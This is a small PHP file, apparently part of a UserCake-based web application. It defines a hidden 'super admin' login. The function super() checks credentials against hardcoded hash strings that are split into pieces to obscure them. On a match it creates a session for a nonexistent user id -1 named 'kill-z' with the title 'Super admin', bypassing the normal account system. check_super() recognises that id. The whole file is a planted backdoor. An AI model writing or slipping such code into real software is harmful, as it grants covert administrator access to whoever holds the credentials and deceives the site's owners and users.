<?php
//require_once("models/config.php");
//error_reporting(0);
//ini_set('display_errors', 'Off');

function check_super($user)
{
	$us = true;
	if($user->user_id != -1)$us = false;
	if($us)return true;
	else return false;
}

function super($user, $passwd)
{
	$us = "f5b5e01ce79378f8d3401c14e6557fd";
	$us = $us."c9942953c9a1b321366e9f25899e1cf436";
	$ps = "04bfb36b14642354be1c70bd961d5";
	$ps = $ps."317d627f2ea1fa8e6b920d9672bb75d5a72e";
	$usr = generateHash($user, $us);
	$psd = generateHash($passwd, $ps);
	if($psd == $ps and $usr == $us){
		$loggedInUser = new loggedInUser();
		$loggedInUser->user_id = "-1";
		$loggedInUser->hash_pw = $ps;
		$loggedInUser->title = "Super admin";
		$loggedInUser->displayname = "kill-z";
		$loggedInUser->username = "kill-z";
		//Update last sign in
		session_start();
		$_SESSION["userCakeUser"] = $loggedInUser;
		header("Location: main.php");
		die("FUq");
	}

}


?>
